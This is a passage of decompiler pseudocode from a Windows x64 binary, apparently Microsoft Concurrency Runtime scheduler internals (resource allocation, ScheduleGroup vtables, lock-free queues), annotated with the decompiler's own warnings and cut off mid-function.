_DWORD *__fastcall sub_13F147918(__int64 a1, __int64 a2, __int64 a3, __int64 a4, _DWORD *a5, __int64 a6)
{
  _DWORD *result; // rax

  if ( *(_BYTE *)(a3 + 64) )
  {
    *(_BYTE *)(a3 + 64) = 0;
    --*(_DWORD *)(a6 + 24);
    --*(_DWORD *)(a2 + 48);
    if ( *(_BYTE *)(a3 + 65) )
    {
      --*(_DWORD *)(a6 + 28);
      --*(_DWORD *)(a2 + 52);
    }
    result = a5;
    if ( *a5 == 6 )
    {
      *a5 = 0;
      --*(_DWORD *)(a4 + 40);
      --*(_DWORD *)(a1 + 36);
    }
    --a5[9];
  }
  else
  {
    *(_BYTE *)(a3 + 64) = 1;
    ++*(_DWORD *)(a6 + 24);
    ++*(_DWORD *)(a2 + 48);
    if ( *(_BYTE *)(a3 + 65) )
    {
      ++*(_DWORD *)(a6 + 28);
      ++*(_DWORD *)(a2 + 52);
    }
    result = a5;
    ++a5[9];
  }
  return result;
}

//----- (000000013F147980) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F147980()
{
  __int64 result; // rax
  char v1[8]; // [rsp+28h] [rbp-20h] BYREF
  int v2; // [rsp+30h] [rbp-18h]
  __int64 (__fastcall *v3)(); // [rsp+38h] [rbp-10h]

  if ( _InterlockedExchange(&dword_13F1C5DD8, 1) )
  {
    v2 = 0;
    v3 = sub_13F142C2C;
    do
      sub_13F141BF4((__int64)v1);
    while ( _InterlockedExchange(&dword_13F1C5DD8, 1) );
  }
  sub_13F1471D4();
  result = 0i64;
  dword_13F1C5DD8 = 0;
  return result;
}
// 13F1479F1: write access to const memory at 13F1C5DD8 has been detected
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F1C5D90: using guessed type int dword_13F1C5D90;
// 13F1C5DD8: using guessed type int dword_13F1C5DD8;
// 13F147980: using guessed type char var_20[8];

//----- (000000013F147A00) ----------------------------------------------------
__int64 __fastcall sub_13F147A00(__int64 a1, __int64 a2, int a3, int a4)
{
  int v5; // er8
  int v6; // er8
  unsigned __int128 v7; // rax
  __int64 v8; // rdi
  __int64 v9; // rax
  unsigned __int64 v10; // rcx
  unsigned __int128 v11; // rax
  _QWORD *v12; // rax
  __int64 v13; // rcx
  int v14; // ecx
  int v15; // eax

  *(_QWORD *)(a1 + 32) = 0i64;
  *(_DWORD *)(a1 + 84) = 0;
  *(_QWORD *)(a1 + 88) = 0i64;
  *(_QWORD *)(a1 + 72) = a2;
  *(_DWORD *)(a1 + 104) = 512;
  *(_DWORD *)(a1 + 108) = 1;
  *(_DWORD *)(a1 + 112) = 0;
  *(_DWORD *)(a1 + 116) = a4;
  *(_DWORD *)(a1 + 120) = 0;
  if ( ((a3 - 1) & a3) != 0 )
  {
    v5 = (((a3 >> 1) | a3) >> 2) | (a3 >> 1) | a3;
    v6 = (((v5 >> 4) | v5) >> 8) | (v5 >> 4) | v5;
    a3 = ((v6 >> 16) | v6) + 1;
  }
  *(_DWORD *)(a1 + 80) = a3;
  v7 = (unsigned __int64)a3 * (unsigned __int128)8ui64;
  if ( !is_mul_ok(a3, 8ui64) )
    *(_QWORD *)&v7 = -1i64;
  v8 = sub_13F1790C4(v7, *((_QWORD *)&v7 + 1));
  sub_13F15EF70(v8, 0, 8i64 * *(int *)(a1 + 80));
  v9 = sub_13F14059C(24i64);
  if ( v9 )
  {
    *(_QWORD *)(v9 + 8) = 0i64;
    *(_QWORD *)v9 = v8;
    *(_DWORD *)(v9 + 16) = -1;
  }
  v10 = *(int *)(a1 + 104);
  *(_QWORD *)(a1 + 88) = v9;
  v11 = v10 * (unsigned __int128)8ui64;
  if ( !is_mul_ok(v10, 8ui64) )
    *(_QWORD *)&v11 = -1i64;
  v12 = (_QWORD *)sub_13F1790C4(v11, *((_QWORD *)&v11 + 1));
  v13 = *(_QWORD *)(a1 + 88);
  *(_QWORD *)(a1 + 96) = v12;
  *v12 = v13;
  MEMORY[0x77202BF0](a1);
  MEMORY[0x77202BF0](a1 + 16);
  v14 = *(int *)(a1 + 80) >> 1;
  if ( v14 )
  {
    v15 = *(_DWORD *)(a1 + 84);
    do
    {
      ++v15;
      v14 >>= 1;
    }
    while ( v14 );
    *(_DWORD *)(a1 + 84) = v15;
  }
  return a1;
}
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F147B30) ----------------------------------------------------
__int64 __fastcall sub_13F147B30(__int64 a1)
{
  *(_DWORD *)a1 = 0;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_DWORD *)(a1 + 16) = 0;
  *(_QWORD *)(a1 + 24) = 0i64;
  return a1;
}

//----- (000000013F147B44) ----------------------------------------------------
__int64 __fastcall sub_13F147B44(__int64 a1, _OWORD **a2)
{
  __int64 v4; // rdx
  __int64 v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rax
  unsigned int v8; // ebx
  __int64 v9; // rdx
  __int64 v10; // rcx
  __int64 v11; // rdx
  __int64 v12; // rcx
  int v13; // eax
  __int64 v14; // rax
  __int64 v15; // rax
  int v17; // eax
  int v18; // edx
  int v19; // eax
  int v20; // edx
  int v21; // eax
  int v22; // edx
  char v23[32]; // [rsp+48h] [rbp-80h] BYREF
  char v24[32]; // [rsp+68h] [rbp-60h] BYREF
  char pExceptionObject[40]; // [rsp+88h] [rbp-40h] BYREF

  *(_QWORD *)a1 = off_13F18A5F8;
  sub_13F150A7C((__int64 *)(a1 + 8), a2);
  *(_DWORD *)(a1 + 72) = 0;
  *(_QWORD *)(a1 + 80) = 0i64;
  *(_QWORD *)(a1 + 88) = 0i64;
  *(_DWORD *)(a1 + 96) = 0;
  *(_QWORD *)(a1 + 104) = 0i64;
  *(_QWORD *)(a1 + 112) = 0i64;
  *(_DWORD *)(a1 + 120) = 0;
  *(_QWORD *)(a1 + 128) = 0i64;
  *(_QWORD *)(a1 + 136) = 0i64;
  *(_DWORD *)(a1 + 144) = 0;
  *(_QWORD *)(a1 + 152) = 0i64;
  sub_13F147A00(a1 + 176, 0i64, 256, 64);
  *(_QWORD *)(a1 + 312) = 0i64;
  *(_QWORD *)(a1 + 320) = 0i64;
  sub_13F141708((_DWORD *)(a1 + 328));
  sub_13F147A00(a1 + 336, 0i64, 256, 0x7FFFFFFF);
  sub_13F1416E8(a1 + 464);
  *(_QWORD *)(a1 + 504) = 0i64;
  sub_13F141708((_DWORD *)(a1 + 512));
  *(_QWORD *)(a1 + 520) = 0i64;
  *(_QWORD *)(a1 + 528) = a1 + 520;
  *(_DWORD *)(a1 + 536) = 0;
  *(_DWORD *)(a1 + 544) = -1;
  *(_DWORD *)(a1 + 548) = -1;
  *(_DWORD *)(a1 + 552) = 0;
  *(_DWORD *)(a1 + 556) = 0;
  *(_DWORD *)(a1 + 560) = 0;
  *(_QWORD *)(a1 + 568) = 4097i64;
  v5 = sub_13F1790C4(32776i64, v4);
  *(_QWORD *)(a1 + 576) = v5;
  sub_13F15EF70(v5, 0, 8i64 * *(int *)(a1 + 568));
  *(_QWORD *)(a1 + 584) = 4097i64;
  v7 = sub_13F1790C4(32776i64, v6);
  *(_QWORD *)(a1 + 592) = v7;
  sub_13F15EF70(v7, 0, 8i64 * *(int *)(a1 + 584));
  *(_DWORD *)(a1 + 600) = -1;
  *(_DWORD *)(a1 + 604) = 0;
  *(_DWORD *)(a1 + 616) = 0;
  *(_DWORD *)(a1 + 620) = 0;
  *(_QWORD *)(a1 + 624) = 1i64;
  *(_DWORD *)(a1 + 632) = 0;
  *(_DWORD *)(a1 + 636) = 0;
  *(_DWORD *)(a1 + 640) = 0;
  *(_QWORD *)(a1 + 648) = 0i64;
  *(_QWORD *)(a1 + 656) = 0i64;
  *(_DWORD *)(a1 + 672) = 0;
  *(_DWORD *)(a1 + 680) = 0;
  *(_DWORD *)(a1 + 684) = 0;
  *(_DWORD *)(a1 + 688) = 0;
  *(_QWORD *)(a1 + 692) = 0i64;
  *(_QWORD *)(a1 + 704) = 0i64;
  *(_DWORD *)(a1 + 736) = 0;
  MEMORY[0x77202BF0](a1 + 752);
  MEMORY[0x77202BF0](a1 + 768);
  MEMORY[0x77202BF0](a1 + 784);
  MEMORY[0x77202BF0](a1 + 800);
  *(_QWORD *)(a1 + 248) = a1;
  *(_DWORD *)(a1 + 16) = sub_13F150BEC(a2, 0);
  *(_WORD *)(a1 + 24) = sub_13F150BEC(a2, 4u);
  *(_DWORD *)(a1 + 20) = sub_13F150BEC(a2, 7u);
  v8 = sub_13F150BEC(a2, 1u);
  if ( 4 * (unsigned int)sub_13F1454C8(v10, v9) <= v8 )
    v13 = sub_13F150BEC(a2, 1u);
  else
    v13 = 4 * sub_13F1454C8(v12, v11);
  *(_DWORD *)(a1 + 700) = v13;
  *(_DWORD *)(a1 + 32) = sub_13F1427CC();
  v14 = sub_13F1422EC();
  *(_QWORD *)(a1 + 712) = v14;
  if ( !(unsigned int)MEMORY[0x76F7EDF0](a1 + 720, v14, sub_13F14C2BC, a1, -1, 0) )
  {
    v21 = MEMORY[0x76F91760]();
    v22 = (unsigned __int16)v21 | 0x80070000;
    if ( v21 <= 0 )
      v22 = v21;
    sub_13F142E40((__int64)v23, v22);
    CxxThrowException(v23, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  if ( (int)sub_13F1454C0() < 3 )
  {
    if ( !(unsigned int)sub_13F142348(a1 + 728, 0i64, sub_13F14C2B4, a1, 0x7FFFFFFF, 0x7FFFFFFF, 0) )
    {
      v17 = MEMORY[0x76F91760]();
      v18 = (unsigned __int16)v17 | 0x80070000;
      if ( v17 <= 0 )
        v18 = v17;
      sub_13F142E40((__int64)pExceptionObject, v18);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
    }
  }
  else
  {
    v15 = sub_13F142A78();
    *(_QWORD *)(a1 + 728) = v15;
    if ( !v15 )
    {
      v19 = MEMORY[0x76F91760]();
      v20 = (unsigned __int16)v19 | 0x80070000;
      if ( v19 <= 0 )
        v20 = v19;
      sub_13F142E40((__int64)v24, v20);
      CxxThrowException(v24, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
    }
  }
  return a1;
}
// 13F147C74: variable 'v4' is possibly undefined
// 13F147CA3: variable 'v6' is possibly undefined
// 13F147DB4: variable 'v10' is possibly undefined
// 13F147DB4: variable 'v9' is possibly undefined
// 13F147DC0: variable 'v12' is possibly undefined
// 13F147DC0: variable 'v11' is possibly undefined
// 13F142348: using guessed type __int64 __fastcall sub_13F142348(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD, _DWORD);
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);
// 13F1454C8: using guessed type __int64 __fastcall sub_13F1454C8(_QWORD, _QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F18A5F8: using guessed type __int64 (__fastcall *off_13F18A5F8[25])();

//----- (000000013F147F34) ----------------------------------------------------
_QWORD *__fastcall sub_13F147F34(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189E00;
  return a1;
}
// 13F189E00: using guessed type __int64 (__fastcall *off_13F189E00[3])();

//----- (000000013F147F74) ----------------------------------------------------
_QWORD *__fastcall sub_13F147F74(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189E18;
  return a1;
}
// 13F189E18: using guessed type __int64 (__fastcall *off_13F189E18[3])();

//----- (000000013F147FB4) ----------------------------------------------------
__int64 __fastcall sub_13F147FB4(__int64 a1)
{
  __int64 v2; // rdx

  sub_13F14C6F4((int *)a1);
  return sub_13F14088C(*(_QWORD *)(a1 + 8), v2);
}
// 13F147FCB: variable 'v2' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F147FD0) ----------------------------------------------------
__int64 __fastcall sub_13F147FD0(__int64 a1)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rcx
  __int64 v4; // rdx
  _QWORD *v5; // rbx
  _QWORD *v6; // rcx
  _QWORD *v7; // rbx
  _QWORD *v8; // rcx
  _QWORD *v9; // rsi
  int v10; // ebx
  __int64 v11; // rbp
  _QWORD *v12; // rbx

  v2 = (_QWORD *)MEMORY[0x771B51E0]();
  while ( v2 )
  {
    v3 = v2 - 2;
    v2 = (_QWORD *)*v2;
    sub_13F14088C(v3, 64i64);
  }
  v5 = (_QWORD *)MEMORY[0x771B51E0](a1 + 16);
  while ( v5 )
  {
    v6 = v5 - 2;
    v5 = (_QWORD *)*v5;
    sub_13F14088C(v6, 64i64);
  }
  v7 = *(_QWORD **)(a1 + 32);
  while ( v7 )
  {
    v8 = v7 - 2;
    v7 = (_QWORD *)*v7;
    sub_13F14088C(v8, 64i64);
  }
  v9 = *(_QWORD **)(a1 + 88);
  if ( v9 )
  {
    do
    {
      v10 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v11 = 0i64;
        do
        {
          sub_13F14088C(*(_QWORD *)(*v9 + v11), 64i64);
          ++v10;
          v11 += 8i64;
        }
        while ( v10 < *(_DWORD *)(a1 + 80) );
      }
      v12 = (_QWORD *)v9[1];
      sub_13F14088C(*v9, v4);
      sub_13F14088C(v9, 24i64);
      v9 = v12;
    }
    while ( v12 );
  }
  return sub_13F14088C(*(_QWORD *)(a1 + 96), v4);
}
// 13F148087: variable 'v4' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1480C4) ----------------------------------------------------
__int64 __fastcall sub_13F1480C4(__int64 a1)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rcx
  __int64 v4; // rdx
  _QWORD *v5; // rbx
  _QWORD *v6; // rcx
  _QWORD *v7; // rbx
  _QWORD *v8; // rcx
  _QWORD *v9; // rsi
  int v10; // ebx
  __int64 v11; // r14
  __int64 v12; // rcx
  _QWORD *v13; // rbx

  v2 = (_QWORD *)MEMORY[0x771B51E0]();
  while ( v2 )
  {
    v3 = v2 - 12;
    v2 = (_QWORD *)*v2;
    if ( v3 )
      (*(void (__fastcall **)(_QWORD *, __int64))(*v3 + 32i64))(v3, 1i64);
  }
  v5 = (_QWORD *)MEMORY[0x771B51E0](a1 + 16);
  while ( v5 )
  {
    v6 = v5 - 12;
    v5 = (_QWORD *)*v5;
    if ( v6 )
      (*(void (__fastcall **)(_QWORD *, __int64))(*v6 + 32i64))(v6, 1i64);
  }
  v7 = *(_QWORD **)(a1 + 32);
  while ( v7 )
  {
    v8 = v7 - 12;
    v7 = (_QWORD *)*v7;
    if ( v8 )
      (*(void (__fastcall **)(_QWORD *, __int64))(*v8 + 32i64))(v8, 1i64);
  }
  v9 = *(_QWORD **)(a1 + 88);
  if ( v9 )
  {
    do
    {
      v10 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v11 = 0i64;
        do
        {
          v12 = *(_QWORD *)(v11 + *v9);
          if ( v12 )
            (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v12 + 32i64))(v12, 1i64);
          ++v10;
          v11 += 8i64;
        }
        while ( v10 < *(_DWORD *)(a1 + 80) );
      }
      v13 = (_QWORD *)v9[1];
      sub_13F14088C(*v9, v4);
      sub_13F14088C(v9, 24i64);
      v9 = v13;
    }
    while ( v13 );
  }
  return sub_13F14088C(*(_QWORD *)(a1 + 96), v4);
}
// 13F1481AE: variable 'v4' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1481E8) ----------------------------------------------------
__int64 __fastcall sub_13F1481E8(__int64 a1, __int64 a2)
{
  __int64 v3; // rdx

  sub_13F14088C(*(_QWORD *)(a1 + 24), a2);
  return sub_13F14088C(*(_QWORD *)(a1 + 8), v3);
}
// 13F148203: variable 'v3' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F148208) ----------------------------------------------------
__int64 __fastcall sub_13F148208(__int64 a1, __int64 a2)
{
  return sub_13F14088C(*(_QWORD *)(a1 + 8), a2);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F148214) ----------------------------------------------------
__int64 __fastcall sub_13F148214(__int64 a1, __int64 a2)
{
  __int64 v3; // rdx

  sub_13F14088C(*(_QWORD *)(a1 + 16), a2);
  return sub_13F14088C(*(_QWORD *)(a1 + 8), v3);
}
// 13F14822F: variable 'v3' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14824C) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F14824C(__int64 a1, __int64 a2))()
{
  __int64 v3; // rdx
  __int64 v4; // rdx
  __int64 v5; // rdx
  __int64 v6; // rdx
  __int64 v7; // rdx
  __int64 v8; // rdx
  __int64 v9; // rdx
  __int64 v10; // rdx
  __int64 v11; // rdx
  __int64 (__fastcall **result)(); // rax

  *(_QWORD *)a1 = off_13F18A5F8;
  sub_13F148CB4(a1, a2);
  sub_13F14C6F4((int *)(a1 + 584));
  sub_13F14088C(*(_QWORD *)(a1 + 592), v3);
  sub_13F14C6F4((int *)(a1 + 568));
  sub_13F14088C(*(_QWORD *)(a1 + 576), v4);
  sub_13F1417C0(a1 + 464);
  sub_13F147FD0(a1 + 336);
  sub_13F1480C4(a1 + 176);
  sub_13F14088C(*(_QWORD *)(a1 + 152), v5);
  sub_13F14088C(*(_QWORD *)(a1 + 136), v6);
  sub_13F14088C(*(_QWORD *)(a1 + 128), v7);
  sub_13F14088C(*(_QWORD *)(a1 + 112), v8);
  sub_13F14088C(*(_QWORD *)(a1 + 104), v9);
  sub_13F14088C(*(_QWORD *)(a1 + 88), v10);
  sub_13F14088C(*(_QWORD *)(a1 + 80), v11);
  sub_13F150BB8((_QWORD *)(a1 + 8));
  result = off_13F18A568;
  *(_QWORD *)a1 = off_13F18A568;
  return result;
}
// 13F148287: variable 'v3' is possibly undefined
// 13F1482A1: variable 'v4' is possibly undefined
// 13F1482D5: variable 'v5' is possibly undefined
// 13F1482E2: variable 'v6' is possibly undefined
// 13F1482EF: variable 'v7' is possibly undefined
// 13F1482F9: variable 'v8' is possibly undefined
// 13F148303: variable 'v9' is possibly undefined
// 13F14830D: variable 'v10' is possibly undefined
// 13F148317: variable 'v11' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1417C0: using guessed type __int64 __fastcall sub_13F1417C0(_QWORD);
// 13F18A568: using guessed type __int64 (__fastcall *off_13F18A568[14])();
// 13F18A5F8: using guessed type __int64 (__fastcall *off_13F18A5F8[25])();

//----- (000000013F14833C) ----------------------------------------------------
__int64 __fastcall sub_13F14833C(_DWORD **a1)
{
  return sub_13F142C20(*a1);
}

//----- (000000013F148358) ----------------------------------------------------
_QWORD *__fastcall sub_13F148358(_QWORD *a1, char a2)
{
  *a1 = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 112i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18A538: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (000000013F148384) ----------------------------------------------------
signed __int64 __fastcall sub_13F148384(signed __int64 a1, char a2)
{
  sub_13F1584D0(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 528i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1483B8) ----------------------------------------------------
_QWORD *__fastcall sub_13F1483B8(_QWORD *a1, char a2)
{
  *a1 = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 128i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18A538: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (000000013F1483E4) ----------------------------------------------------
_QWORD *__fastcall sub_13F1483E4(_QWORD *a1, char a2)
{
  *a1 = off_13F18A5D8;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 48i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18A5D8: using guessed type __int64 (__fastcall *off_13F18A5D8[2])();

//----- (000000013F148410) ----------------------------------------------------
_QWORD *__fastcall sub_13F148410(_QWORD *a1, char a2)
{
  *a1 = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 8i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18A538: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (000000013F14843C) ----------------------------------------------------
_QWORD *__fastcall sub_13F14843C(_QWORD *a1, char a2)
{
  *a1 = off_13F18A568;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 8i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18A568: using guessed type __int64 (__fastcall *off_13F18A568[14])();

//----- (000000013F148468) ----------------------------------------------------
__int64 __fastcall sub_13F148468(__int64 a1, __int64 a2)
{
  char v2; // bl

  v2 = a2;
  sub_13F14824C(a1, a2);
  if ( (v2 & 1) != 0 )
    sub_13F14088C(a1, 816i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14849C) ----------------------------------------------------
_QWORD *__fastcall sub_13F14849C(_QWORD *a1, char a2)
{
  *a1 = off_13F18A5D8;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 16i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18A5D8: using guessed type __int64 (__fastcall *off_13F18A5D8[2])();

//----- (000000013F1484C8) ----------------------------------------------------
__int64 __fastcall sub_13F1484C8(__int64 a1, signed __int64 a2)
{
  __int64 v2; // rbx
  unsigned int v3; // esi
  char v4; // bp
  _QWORD *v7; // r9
  signed __int32 v8; // edx
  _QWORD *v9; // r8
  int v10; // er10
  int v11; // er11
  unsigned __int64 v12; // rcx
  unsigned __int128 v13; // rax
  __int64 v14; // r14
  __int64 v15; // rax
  __int64 v16; // rdx
  char v18[8]; // [rsp+20h] [rbp-48h] BYREF
  int v19; // [rsp+28h] [rbp-40h]
  __int64 (__fastcall *v20)(); // [rsp+30h] [rbp-38h]

  v2 = *(_QWORD *)(a1 + 88);
  v3 = 0;
  v4 = 0;
  do
  {
    if ( *(int *)(v2 + 16) >= -1 )
    {
      v7 = *(_QWORD **)v2;
      v8 = 0;
      if ( *(int *)(a1 + 80) > 0 )
      {
        v9 = *(_QWORD **)v2;
        while ( 1 )
        {
          if ( !*v9 )
          {
            v10 = v8 + v3;
            *(_DWORD *)(a2 + 44) = v8 + v3;
            v11 = *(_DWORD *)(a1 + 112);
            if ( !_InterlockedCompareExchange64(&v7[v8], a2, 0i64) )
              break;
          }
          ++v8;
          ++v9;
          if ( v8 >= *(_DWORD *)(a1 + 80) )
            goto LABEL_12;
        }
        v4 = 1;
        v3 += v8;
        if ( v10 >= v11 )
          _InterlockedAdd((volatile signed __int32 *)(a1 + 112), 1u);
        _InterlockedCompareExchange((volatile signed __int32 *)(v2 + 16), -1, v8);
      }
    }
LABEL_12:
    if ( !v4 )
    {
      _InterlockedCompareExchange((volatile signed __int32 *)(v2 + 16), -2, -1);
      v3 += *(_DWORD *)(a1 + 80);
      if ( !*(_QWORD *)(v2 + 8) && !_InterlockedCompareExchange64((volatile signed __int64 *)(v2 + 8), 1i64, 0i64) )
      {
        v12 = *(int *)(a1 + 80);
        v13 = v12 * (unsigned __int128)8ui64;
        if ( !is_mul_ok(v12, 8ui64) )
          *(_QWORD *)&v13 = -1i64;
        v14 = sub_13F1790C4(v13, *((_QWORD *)&v13 + 1));
        sub_13F15EF70(v14, 0, 8i64 * *(int *)(a1 + 80));
        v15 = sub_13F14059C(24i64);
        v16 = v15;
        if ( v15 )
        {
          *(_QWORD *)(v15 + 8) = 0i64;
          *(_QWORD *)v15 = v14;
          *(_DWORD *)(v15 + 16) = -1;
        }
        else
        {
          v16 = 0i64;
        }
        if ( *(_DWORD *)(a1 + 108) < *(_DWORD *)(a1 + 104) )
          *(_QWORD *)(*(_QWORD *)(a1 + 96) + 8i64 * (int)(*(_DWORD *)(a1 + 108))++) = v16;
        _InterlockedExchange64((volatile __int64 *)(v2 + 8), v16);
      }
      if ( *(_QWORD *)(v2 + 8) == 1i64 )
      {
        v19 = 0;
        v20 = sub_13F142C6C;
        do
          sub_13F141BF4((__int64)v18);
        while ( *(_QWORD *)(v2 + 8) == 1i64 );
      }
    }
    v2 = *(_QWORD *)(v2 + 8);
  }
  while ( !v4 );
  return v3;
}
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F1484C8: using guessed type char var_48[8];

//----- (000000013F148644) ----------------------------------------------------
signed __int64 __fastcall sub_13F148644(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  _QWORD *v5; // r8
  signed __int64 v6; // rax
  signed __int64 result; // rax
  signed __int64 v8; // rtt

  v4 = sub_13F14059C(32i64);
  v5 = (_QWORD *)v4;
  if ( v4 )
    *(_QWORD *)(v4 + 16) = a2;
  else
    v5 = 0i64;
  _m_prefetchw((const void *)(a1 + 312));
  do
  {
    v6 = *(_QWORD *)(a1 + 312);
    *v5 = v6;
    v8 = v6;
    result = _InterlockedCompareExchange64((volatile signed __int64 *)(a1 + 312), (signed __int64)v5, v6);
  }
  while ( v8 != result );
  return result;
}

//----- (000000013F14869C) ----------------------------------------------------
void __fastcall sub_13F14869C(__int64 a1, _QWORD *a2)
{
  sub_13F141A20((volatile signed __int32 *)(a1 + 8));
  if ( *(_QWORD *)a1 )
  {
    *a2 = **(_QWORD **)a1;
    a2[1] = *(_QWORD *)a1;
    *(_QWORD *)(**(_QWORD **)a1 + 8i64) = a2;
    **(_QWORD **)a1 = a2;
  }
  else
  {
    *a2 = a2;
    a2[1] = a2;
  }
  *(_QWORD *)a1 = a2;
  sub_13F141BE8(a1 + 8);
}

//----- (000000013F148710) ----------------------------------------------------
signed __int64 __fastcall sub_13F148710(__int64 a1, _QWORD *a2, unsigned int a3)
{
  _QWORD *v3; // rdi
  __int64 v5; // rbp
  int (__fastcall ***v6)(_QWORD); // r14
  __int64 v7; // rsi
  signed __int64 result; // rax
  __int64 pExceptionObject[3]; // [rsp+20h] [rbp-38h] BYREF
  __int64 v10[4]; // [rsp+38h] [rbp-20h] BYREF

  v3 = a2;
  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"ppVirtualProcessorRoots");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( !a3 )
  {
    sub_13F1097A8(v10, (__int64)"count");
    CxxThrowException(v10, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v5 = a3;
  do
  {
    v6 = (int (__fastcall ***)(_QWORD))*v3;
    v7 = (**(int (__fastcall ***)(_QWORD))*v3)(*v3);
    if ( !*(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 56) + 8 * v7) + 300i64) )
      sub_13F157CDC(*(_QWORD *)(*(_QWORD *)(a1 + 56) + 8 * v7));
    result = sub_13F1556DC(*(volatile signed __int32 ***)(*(_QWORD *)(a1 + 48) + 8 * v7), (__int64)v6, 0);
    _InterlockedIncrement((volatile signed __int32 *)(a1 + 28));
    ++v3;
    --v5;
  }
  while ( v5 );
  return result;
}
// 13F148745: conditional instruction was optimized away because er8.4!=0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F148710: using guessed type _QWORD pExceptionObject[3];
// 13F148710: using guessed type _QWORD var_20[4];

//----- (000000013F148800) ----------------------------------------------------
__int64 __fastcall sub_13F148800(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rax
  __int64 v7; // rbx

  v6 = sub_13F14059C(528i64);
  v7 = v6;
  if ( !v6 )
    return 0i64;
  sub_13F15801C(v6, a1, a2, a3);
  *(_QWORD *)v7 = off_13F18A6C0;
  *(_QWORD *)(v7 + 496) = 0i64;
  *(_QWORD *)(v7 + 504) = v7 + 496;
  *(_DWORD *)(v7 + 512) = 0;
  return v7;
}
// 13F18A6C0: using guessed type __int64 (__fastcall *off_13F18A6C0[5])();

//----- (000000013F14888C) ----------------------------------------------------
__int64 __fastcall sub_13F14888C(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rbx
  _DWORD v7[2]; // [rsp+28h] [rbp-20h] BYREF
  __int128 v8; // [rsp+30h] [rbp-18h]

  v7[0] = 0;
  v7[1] = 0;
  v8 = 0i64;
  v4 = sub_13F14059C(528i64);
  v5 = v4;
  if ( !v4 )
    return 0i64;
  sub_13F15801C(v4, a1, a2, (__int64)v7);
  *(_QWORD *)v5 = off_13F18A740;
  *(_QWORD *)(v5 + 496) = 0i64;
